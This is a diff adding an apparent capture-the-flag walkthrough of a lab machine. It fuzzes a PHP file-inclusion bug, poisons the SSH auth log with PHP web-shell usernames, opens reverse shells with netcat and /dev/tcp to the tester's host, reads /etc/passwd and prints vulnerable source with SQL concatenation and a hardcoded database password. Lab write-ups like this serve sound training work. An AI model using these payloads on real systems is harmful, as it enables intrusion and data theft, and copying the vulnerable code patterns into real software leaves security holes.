@@ -179,6 +179,9 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
 </code></pre>
 <h2 id="attacking-web">Attacking web</h2>
+<figure>
+<img src="1.web-homepage.png" alt="" /><figcaption>1.web-homepage</figcaption>
+</figure>
 <pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -616,5 +619,1005 @@ Scanning: http://192.168.56.93/javascript/
 Scanning: http://192.168.56.93/server-status/
 Scanning: http://192.168.56.93/gods/
 </code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/ --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,400 -q -f --wildcard -x php,cgi,bak,txt,zip,py,js
+/css/                 (Status: 200) [Size: 948]
+/manual/              (Status: 200) [Size: 626]
+/js/                  (Status: 200) [Size: 947]
+/sea.php              (Status: 302) [Size: 0] [--&gt; atlantis.php]
+/atlantis.php         (Status: 200) [Size: 1718]
+/gods/                (Status: 200) [Size: 1339]
+</code></pre>
+<figure>
+<img src="2.gods.png" alt="" /><figcaption>2.gods</figcaption>
+</figure>
+<h3 id="gods">/gods</h3>
+<pre class="shell"><code>wget -q http://$RHOST/gods/{hades,poseidon,zeus}.log
+</code></pre>
+<pre class="shell"><code>ls -la
+total 20
+drwxr-xr-x 2 f0c1s f0c1s 4096 Jan  8 10:24 .
+drwxr-xr-x 3 f0c1s f0c1s 4096 Jan  8 10:23 ..
+-rw-r--r-- 1 f0c1s f0c1s  295 Aug 19  2019 hades.log
+-rw-r--r-- 1 f0c1s f0c1s  252 Aug 19  2019 poseidon.log
+-rw-r--r-- 1 f0c1s f0c1s  199 Aug 19  2019 zeus.log
+</code></pre>
+<pre class="shell"><code>wc *.log
+  1  54 295 hades.log
+  1  45 252 poseidon.log
+  1  39 199 zeus.log
+  3 138 746 total
+</code></pre>
+<pre class="shell"><code>cat hades.log
+Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.
+</code></pre>
+<pre class="shell"><code>cat poseidon.log
+Poseidon was the god of the sea, earthquakes and horses. Although he was officially one of the supreme gods of Mount Olympus, he spent most of his time in his watery domain. Poseidon was brother to Zeus and Hades. These three gods divided up creation.
+</code></pre>
+<pre class="shell"><code>cat zeus.log
+Zeus is the god of the sky, lightning and thunder in Ancient Greek religion and myth, and king of the gods on Mount Olympus. Zeus is the sixth child of Kronos and Rhea, king and queen of the Titans.
+</code></pre>
+<p>Put these lines in a file, get uppercase and lowercase in one single file, attack ssh? Users: hades, poseidon, zeus???</p>
+<pre class="shell"><code></code></pre>
+<h3 id="sea.php">sea.php</h3>
+<figure>
+<img src="3.sea-takes-you-to-atlantis.png" alt="" /><figcaption>3.sea-takes-you-to-atlantis</figcaption>
+</figure>
+<p>This is backwards. sea.php should be login page, and atlantis.php should be the prize hidden behind that.</p>
+<figure>
+<img src="4.bad-pass-works.png" alt="" /><figcaption>4.bad-pass-works</figcaption>
+</figure>
+<figure>
+<img src="5.back-to-sea-php.png" alt="" /><figcaption>5.back-to-sea-php</figcaption>
+</figure>
+<figure>
+<img src="6.file-param.png" alt="" /><figcaption>6.file-param</figcaption>
+</figure>
+<h2 id="curl">curl</h2>
+<pre class="shell"><code>curl -v --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; http://$RHOST/sea.php?file=hades
+*   Trying 192.168.56.93:80...
+* Connected to 192.168.56.93 (192.168.56.93) port 80 (#0)
+&gt; GET /sea.php?file=hades HTTP/1.1
+&gt; Host: 192.168.56.93
+&gt; User-Agent: curl/7.80.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=u0ncuofbfvt9p5nkn694bjr841
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sat, 08 Jan 2022 07:12:01 GMT
+&lt; Server: Apache/2.4.38 (Debian)
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt; Vary: Accept-Encoding
+&lt; Content-Length: 872
+&lt; Content-Type: text/html; charset=UTF-8
+&lt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+&lt;div class=&quot;d-flex justify-content-center align-items-center&quot; style=&quot;height:100px;&quot;&gt;
+  &lt;div class=&quot;form-group&quot;&gt;
+    &lt;select onchange=&quot;location = this.value;&quot;&gt;
+      &lt;option selected=&quot;&quot;&gt;Select a God&lt;/option&gt;
+      &lt;option value=&quot;?file=hades&quot;&gt;Hades&lt;/option&gt;
+      &lt;option value=&quot;?file=poseidon&quot;&gt;Poseidon&lt;/option&gt;
+      &lt;option value=&quot;?file=zeus&quot;&gt;Zeus&lt;/option&gt;
+    &lt;/select&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;script src=&quot;js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+* Connection #0 to host 192.168.56.93 left intact
+</code></pre>
+<pre class="shell"><code>curl -s --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; http://$RHOST/sea.php?file=hades
+&lt;html&gt;
+&lt;head&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+&lt;div class=&quot;d-flex justify-content-center align-items-center&quot; style=&quot;height:100px;&quot;&gt;
+  &lt;div class=&quot;form-group&quot;&gt;
+    &lt;select onchange=&quot;location = this.value;&quot;&gt;
+      &lt;option selected=&quot;&quot;&gt;Select a God&lt;/option&gt;
+      &lt;option value=&quot;?file=hades&quot;&gt;Hades&lt;/option&gt;
+      &lt;option value=&quot;?file=poseidon&quot;&gt;Poseidon&lt;/option&gt;
+      &lt;option value=&quot;?file=zeus&quot;&gt;Zeus&lt;/option&gt;
+    &lt;/select&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;script src=&quot;js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+Hades was the god of the underworld and the name eventually came to also describe the home of the dead as well. He was the oldest male child of Cronus and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and the Titans to end their reign, claiming rulership over the cosmos.
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre class="shell"><code>curl -s --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; http://$RHOST/sea.php?file=hades | html2text
+[One of: Select a God/Hades/Poseidon/Zeus]
+ Hades was the god of the underworld and the name eventually came to also
+describe the home of the dead as well. He was the oldest male child of Cronus
+and Rhea. Hades and his brothers Zeus and Poseidon defeated their father and
+the Titans to end their reign, claiming rulership over the cosmos.
+</code></pre>
+<h2 id="fuzz">fuzz</h2>
+<pre class="shell"><code>ffuf -u http://$RHOST/sea.php?file=FUZZ -w ./gods.words.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+hades
+poseidon
+zeus
+
+</code></pre>
+<p><code>-fs</code> stands for file size of the response, it was 577 bytes for failing (but 200 return) pages.</p>
+<p><code>-b</code> is for cookie</p>
+<pre class="shell"><code>ffuf -u http://$RHOST/sea.php?file=FUZZ -w /usr/share/wordlists/wfuzz/general/big.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+zeus
+
+ffuf -u http://$RHOST/sea.php?file=FUZZ -w /usr/share/wordlists/wfuzz/general/mutations_common.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+## nothing
+
+ffuf -u http://$RHOST/sea.php?file=FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+## nothing
+
+ffuf -u http://$RHOST/sea.php?file=FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+zeus
+hades
+
+ffuf -u http://$RHOST/sea.php?file=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+## nothing
+
+ffuf -u http://$RHOST/sea.php?file=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+## nothing</code></pre>
+<pre class="shell"><code>for dir in `echo &quot;../ ../../ ../../../ ../../../../ ../../../../../ ../../../../../../ ../../../../../../../ ../../../../../../../ ../../../../../../../../&quot; | tr &quot; &quot; &quot;\n&quot;`
+do
+echo $dir
+ffuf -u &quot;http://$RHOST/sea.php?file=${dir}FUZZ&quot; -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+done
+../
+
+../../
+
+../../../
+
+../../../../
+/var/log/auth
+
+../../../../../
+/var/log/auth
+
+../../../../../../
+/var/log/auth
+
+../../../../../../../
+/var/log/auth
+
+../../../../../../../
+/var/log/auth
+
+../../../../../../../../
+/var/log/auth
+
+</code></pre>
+<pre class="shell"><code>for dir in `echo &quot;../ ../../ ../../../ ../../../../ ../../../../../ ../../../../../../ ../../../../../../../ ../../../../../../../ ../../../../../../../../&quot; | tr &quot; &quot; &quot;\n&quot;`
+do
+echo $dir
+ffuf -u &quot;http://$RHOST/sea.php?file=${dir}FUZZ&quot; -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -fc 403,404,401,400 -b &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; -s -fs 577
+done
+../
+
+../../
+
+../../../
+
+../../../../
+
+../../../../../
+
+../../../../../../
+
+../../../../../../../
+
+../../../../../../../
+
+../../../../../../../../
+
+</code></pre>
+<figure>
+<img src="7.var-log-auth.png" alt="" /><figcaption>7.var-log-auth</figcaption>
+</figure>
+<h2 id="rce-via-ssh">RCE via SSH</h2>
+<p>I have recently seen it.</p>
+<pre class="shell"><code>ssh &#39;&lt;?php echo passthru(&quot;whoami&quot;); ?&gt;&#39;@$RHOST
+&lt;?php echo passthru(&quot;whoami&quot;); ?&gt;@192.168.56.93&#39;s password:
+
+</code></pre>
+<pre class="shell"><code>ssh &#39;&lt;?php echo passthru(&quot;id&quot;); ?&gt;&#39;@$RHOST
+&lt;?php echo passthru(&quot;id&quot;); ?&gt;@192.168.56.93&#39;s password:
+
+</code></pre>
+<pre class="shell"><code>curl -s http://$RHOST/sea.php?file=../../../../var/log/auth --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; | html2text | tail -n5
+192.168.56.70 port 41208 [preauth] Jan 8 01:36:24 symfonos4 sshd[2089]: Invalid
+user uid=33(www-data) gid=33(www-data) groups=33(www-data) from 192.168.56.70
+port 41210 Jan 8 01:36:25 symfonos4 sshd[2089]: Connection closed by invalid
+user uid=33(www-data) gid=33(www-data) groups=33(www-data) 192.168.56.70 port
+41210 [preauth]</code></pre>
+<figure>
+<img src="8.rce-via-log.png" alt="" /><figcaption>8.rce-via-log</figcaption>
+</figure>
+<p>Log4shell vuln is still hot, even today (2022.01.08).</p>
+<p><a href="../corrosion-1/corrosion-1.html#injecting-a-webshell">Readup on corrosion#injecting-a-webshell</a></p>
+<h2 id="bricked-it">Bricked it?</h2>
+<pre class="shell"><code>ssh &#39;&lt;?php echo passthru(&quot;nc 192.168.56.70 443 -e /bin/bash&quot;); ?&gt;&#39;@$RHOST
+&lt;?php echo passthru(&quot;nc 192.168.56.70 443 -e /bin/bash&quot;); ?&gt;@192.168.56.93&#39;s password:
+
+</code></pre>
+<pre class="shell"><code>curl -s http://$RHOST/sea.php?file=../../../../var/log/auth --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; | html2text | tail -n5
+[One of: Select a God/Hades/Poseidon/Zeus]
+
+</code></pre>
+<p>Reset it! And restore it.</p>
+<h2 id="webshell">Webshell</h2>
+<pre class="shell"><code>ssh &#39;&lt;?php system($_GET[&quot;cmd&quot;]) ?&gt;&#39;@$RHOST
+&lt;?php system($_GET[&quot;cmd&quot;]) ?&gt;@192.168.56.93&#39;s password:
+</code></pre>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=id&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot; | html2text | tail -n5
+[One of: Select a God/Hades/Poseidon/Zeus]
+ Jan 8 01:46:32 symfonos4 sshd[733]: Invalid user uid=33(www-data) gid=33(www-
+data) groups=33(www-data) from 192.168.56.70 port 41220 Jan 8 01:46:33
+symfonos4 sshd[733]: Connection closed by invalid user uid=33(www-data) gid=33
+(www-data) groups=33(www-data) 192.168.56.70 port 41220 [preauth]
+</code></pre>
+<p>I had to relogin, to get the PHPSESSID into the web session.</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>First came the tries…</p>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=bash -i &gt;0 /dev/tcp/192.168.56/70/443 0&gt;&amp;1&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+</code></pre>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=bash -c &#39;bash -i &gt;0 /dev/tcp/192.168.56/70/443 0&gt;&amp;1&#39;&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+</code></pre>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=nc -nv 192.168.56.70 443 -e /bin/bash&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+</code></pre>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=nc -nv 192.168.56.70 443 -e /bin/sh&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+</code></pre>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=cat /etc/passwd&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+</code></pre>
+<p>I realized, space might be the issue.</p>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=cat+/etc/passwd&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+&lt;html&gt;
+&lt;head&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+&lt;div class=&quot;d-flex justify-content-center align-items-center&quot; style=&quot;height:100px;&quot;&gt;
+  &lt;div class=&quot;form-group&quot;&gt;
+    &lt;select onchange=&quot;location = this.value;&quot;&gt;
+      &lt;option selected=&quot;&quot;&gt;Select a God&lt;/option&gt;
+      &lt;option value=&quot;?file=hades&quot;&gt;Hades&lt;/option&gt;
+      &lt;option value=&quot;?file=poseidon&quot;&gt;Poseidon&lt;/option&gt;
+      &lt;option value=&quot;?file=zeus&quot;&gt;Zeus&lt;/option&gt;
+    &lt;/select&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;script src=&quot;js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+Jan  8 01:46:32 symfonos4 sshd[733]: Invalid user root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+poseidon:x:1000:1000:,,,:/home/poseidon:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+ from 192.168.56.70 port 41220
+Jan  8 01:46:33 symfonos4 sshd[733]: Connection closed by invalid user root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+poseidon:x:1000:1000:,,,:/home/poseidon:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
+ 192.168.56.70 port 41220 [preauth]
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Space indeed was.</p>
+<pre class="shell"><code>curl -s &quot;http://$RHOST/sea.php?file=../../../../var/log/auth&amp;cmd=nc+-nv+192.168.56.70+443+-e+/bin/sh&quot; --cookie &quot;PHPSESSID=u0ncuofbfvt9p5nkn694bjr841&quot;
+</code></pre>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+Listening on 192.168.56.70 443
+
+Connection received on 192.168.56.93 41102
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+whoami
+www-data
+date
+Sat Jan  8 01:58:53 CST 2022
+hostname
+symfonos4
+
+which python
+/usr/bin/python
+python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+www-data@symfonos4:/var/www/html$ ls -la
+ls -la
+total 152
+drwxr-xr-x 5 root root   4096 Aug 19  2019 .
+drwxr-xr-x 3 root root   4096 Aug 17  2019 ..
+-rw-r--r-- 1 root root   2513 Aug 18  2019 atlantis.php
+drwxr-xr-x 2 root root   4096 Aug 17  2019 css
+drwxr-xr-x 2 root root   4096 Aug 18  2019 gods
+-rw-r--r-- 1 root root 118494 Aug 17  2019 image.jpg
+-rw-r--r-- 1 root root    201 Aug 17  2019 index.html
+drwxr-xr-x 2 root root   4096 Aug 18  2019 js
+-rw-r--r-- 1 root root     39 Aug 17  2019 robots.txt
+-rw-r--r-- 1 root root    739 Aug 18  2019 sea.php
+www-data@symfonos4:/var/www/html$</code></pre>
+<figure>
+<img src="9.caught-a-reverse-shell.png" alt="" /><figcaption>9.caught-a-reverse-shell</figcaption>
+</figure>
+<h3 id="sea.php-1">sea.php</h3>
+<div class="sourceCode" id="cb44"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true"></a><span class="kw">&lt;?php</span></span>
+<span id="cb44-2"><a href="#cb44-2" aria-hidden="true"></a><span class="fu">session_start</span><span class="ot">();</span></span>
+<span id="cb44-3"><a href="#cb44-3" aria-hidden="true"></a><span class="kw">if</span><span class="ot">(</span>!<span class="kw">isset</span><span class="ot">(</span><span class="kw">$_SESSION</span><span class="ot">[</span><span class="st">&#39;logged_in&#39;</span><span class="ot">]))</span>{</span>
+<span id="cb44-4"><a href="#cb44-4" aria-hidden="true"></a>    <span class="fu">header</span><span class="ot">(</span><span class="st">&quot;location:atlantis.php&quot;</span><span class="ot">);</span></span>
+<span id="cb44-5"><a href="#cb44-5" aria-hidden="true"></a>    <span class="kw">die</span><span class="ot">();</span></span>
+<span id="cb44-6"><a href="#cb44-6" aria-hidden="true"></a>}</span>
+<span id="cb44-7"><a href="#cb44-7" aria-hidden="true"></a><span class="kw">?&gt;</span></span>
+<span id="cb44-8"><a href="#cb44-8" aria-hidden="true"></a>&lt;html&gt;</span>
+<span id="cb44-9"><a href="#cb44-9" aria-hidden="true"></a>&lt;head&gt;</span>
+<span id="cb44-10"><a href="#cb44-10" aria-hidden="true"></a>&lt;<span class="fu">link</span> rel=<span class="st">&quot;stylesheet&quot;</span> type=<span class="st">&quot;text/css&quot;</span> href=<span class="st">&quot;css/bootstrap.min.css&quot;</span>&gt;</span>
+<span id="cb44-11"><a href="#cb44-11" aria-hidden="true"></a>&lt;/head&gt;</span>
+<span id="cb44-12"><a href="#cb44-12" aria-hidden="true"></a>&lt;body&gt;</span>
+<span id="cb44-13"><a href="#cb44-13" aria-hidden="true"></a>&lt;div <span class="kw">class</span>=<span class="st">&quot;container&quot;</span>&gt;</span>
+<span id="cb44-14"><a href="#cb44-14" aria-hidden="true"></a>&lt;div <span class="kw">class</span>=<span class="st">&quot;d-flex justify-content-center align-items-center&quot;</span> style=<span class="st">&quot;height:100px;&quot;</span>&gt;</span>
+<span id="cb44-15"><a href="#cb44-15" aria-hidden="true"></a>  &lt;div <span class="kw">class</span>=<span class="st">&quot;form-group&quot;</span>&gt;</span>
+<span id="cb44-16"><a href="#cb44-16" aria-hidden="true"></a>    &lt;select onchange=<span class="st">&quot;location = this.value;&quot;</span>&gt;</span>
+<span id="cb44-17"><a href="#cb44-17" aria-hidden="true"></a>      &lt;option selected=<span class="st">&quot;&quot;</span>&gt;Select a God&lt;/option&gt;</span>
+<span id="cb44-18"><a href="#cb44-18" aria-hidden="true"></a>      &lt;option value=<span class="st">&quot;?file=hades&quot;</span>&gt;Hades&lt;/option&gt;</span>
+<span id="cb44-19"><a href="#cb44-19" aria-hidden="true"></a>      &lt;option value=<span class="st">&quot;?file=poseidon&quot;</span>&gt;Poseidon&lt;/option&gt;</span>
+<span id="cb44-20"><a href="#cb44-20" aria-hidden="true"></a>      &lt;option value=<span class="st">&quot;?file=zeus&quot;</span>&gt;Zeus&lt;/option&gt;</span>
+<span id="cb44-21"><a href="#cb44-21" aria-hidden="true"></a>    &lt;/select&gt;</span>
+<span id="cb44-22"><a href="#cb44-22" aria-hidden="true"></a>  &lt;/div&gt;</span>
+<span id="cb44-23"><a href="#cb44-23" aria-hidden="true"></a>&lt;/div&gt;</span>
+<span id="cb44-24"><a href="#cb44-24" aria-hidden="true"></a>&lt;script src=<span class="st">&quot;js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span>
+<span id="cb44-25"><a href="#cb44-25" aria-hidden="true"></a>&lt;<span class="ot">?</span>php</span>
+<span id="cb44-26"><a href="#cb44-26" aria-hidden="true"></a><span class="kw">include</span><span class="ot">(</span><span class="st">&quot;gods/&quot;</span>. <span class="kw">$_GET</span><span class="ot">[</span><span class="st">&#39;file&#39;</span><span class="ot">]</span>. <span class="st">&#39;.log&#39;</span><span class="ot">);</span></span>
+<span id="cb44-27"><a href="#cb44-27" aria-hidden="true"></a><span class="kw">?&gt;</span></span>
+<span id="cb44-28"><a href="#cb44-28" aria-hidden="true"></a>&lt;/div&gt;</span>
+<span id="cb44-29"><a href="#cb44-29" aria-hidden="true"></a>&lt;/body&gt;</span>
+<span id="cb44-30"><a href="#cb44-30" aria-hidden="true"></a>&lt;/html&gt;</span></code></pre></div>
+<h3 id="atlantis.php">atlantis.php</h3>
+<div class="sourceCode" id="cb45"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true"></a><span class="kw">&lt;?php</span></span>
+<span id="cb45-2"><a href="#cb45-2" aria-hidden="true"></a>   <span class="fu">define</span><span class="ot">(</span><span class="st">&#39;DB_USERNAME&#39;</span><span class="ot">,</span> <span class="st">&#39;root&#39;</span><span class="ot">);</span></span>
+<span id="cb45-3"><a href="#cb45-3" aria-hidden="true"></a>   <span class="fu">define</span><span class="ot">(</span><span class="st">&#39;DB_PASSWORD&#39;</span><span class="ot">,</span> <span class="st">&#39;yVzyRGw3cG2Uyt2r&#39;</span><span class="ot">);</span></span>
+<span id="cb45-4"><a href="#cb45-4" aria-hidden="true"></a>   <span class="kw">$db</span> = <span class="kw">new</span> <span class="kw">PDO</span><span class="ot">(</span><span class="st">&quot;mysql:host=localhost:3306;dbname=db&quot;</span><span class="ot">,</span> <span class="kw">DB_USERNAME</span><span class="ot">,</span><span class="kw">DB_PASSWORD</span><span class="ot">);</span></span>
+<span id="cb45-5"><a href="#cb45-5" aria-hidden="true"></a></span>
+<span id="cb45-6"><a href="#cb45-6" aria-hidden="true"></a>   <span class="fu">session_start</span><span class="ot">();</span></span>
+<span id="cb45-7"><a href="#cb45-7" aria-hidden="true"></a></span>
+<span id="cb45-8"><a href="#cb45-8" aria-hidden="true"></a>   <span class="kw">if</span><span class="ot">(</span><span class="kw">$_SERVER</span><span class="ot">[</span><span class="st">&quot;REQUEST_METHOD&quot;</span><span class="ot">]</span> == <span class="st">&quot;POST&quot;</span><span class="ot">)</span> {</span>
+<span id="cb45-9"><a href="#cb45-9" aria-hidden="true"></a>   <span class="kw">$username</span> = <span class="kw">$_POST</span><span class="ot">[</span><span class="st">&quot;username&quot;</span><span class="ot">];</span></span>
+<span id="cb45-10"><a href="#cb45-10" aria-hidden="true"></a>   <span class="kw">$pwd</span> = <span class="fu">hash</span><span class="ot">(</span><span class="st">&#39;sha256&#39;</span><span class="ot">,</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">&quot;password&quot;</span><span class="ot">]);</span></span>
+<span id="cb45-11"><a href="#cb45-11" aria-hidden="true"></a>   <span class="co">//if (!$db) die ($error);</span></span>
+<span id="cb45-12"><a href="#cb45-12" aria-hidden="true"></a>   <span class="kw">$statement</span> = <span class="kw">$db</span>-&gt;prepare<span class="ot">(</span><span class="st">&quot;Select * from users where username=&#39;&quot;</span>.<span class="kw">$username</span>.<span class="st">&quot;&#39; and pwd=&#39;&quot;</span>.<span class="kw">$pwd</span>.<span class="st">&quot;&#39;&quot;</span><span class="ot">);</span></span>
+<span id="cb45-13"><a href="#cb45-13" aria-hidden="true"></a>   <span class="kw">$statement</span>-&gt;execute<span class="ot">();</span></span>
